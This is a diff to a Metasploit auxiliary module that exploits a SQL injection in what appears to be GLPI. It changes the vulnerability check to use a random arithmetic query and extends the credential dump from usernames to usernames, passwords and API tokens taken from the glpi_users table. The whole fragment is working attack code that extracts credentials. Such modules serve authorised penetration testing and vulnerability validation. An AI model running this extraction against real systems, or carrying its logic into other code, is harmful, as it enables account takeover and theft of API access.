@@ -36,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         'DisclosureDate' => '2025-03-12',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'Reliability' => [REPEATABLE_SESSION],
+          'Reliability' => [],
           'SideEffects' => [IOC_IN_LOGS]
         }
       )
@@ -72,7 +72,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    res = send_request('select 1=1')
+    randnum = SecureRandom.random_number(1000)
+    res = send_request("select #{randnum}=#{randnum}")
 
     return Exploit::CheckCode::Safe('Inventory is disabled and needs to be enabled in order to be vulnerable') if res&.body == 'Inventory is disabled'
 
@@ -98,15 +99,15 @@ class MetasploitModule < Msf::Auxiliary
     creds_table = Rex::Text::Table.new(
       'Header' => 'glpi_users',
       'Indent' => 1,
-      'Columns' => %w[user password]
+      'Columns' => %w[user password api_token]
     )
 
     print_status('Extracting credential information')
 
-    users = @sqli.dump_table_fields('glpi_users', %w[name], '', datastore['MAX_ENTRIES'])
+    users = @sqli.dump_table_fields('glpi_users', %w[name password api_token], '', datastore['MAX_ENTRIES'])
 
-    users.each do |(user, password)|
-      creds_table << [user, password]
+    users.each do |(user, password, api_token)|
+      creds_table << [user, password, api_token]
       create_credential({
         workspace_id: myworkspace_id,
         origin_type: :service,
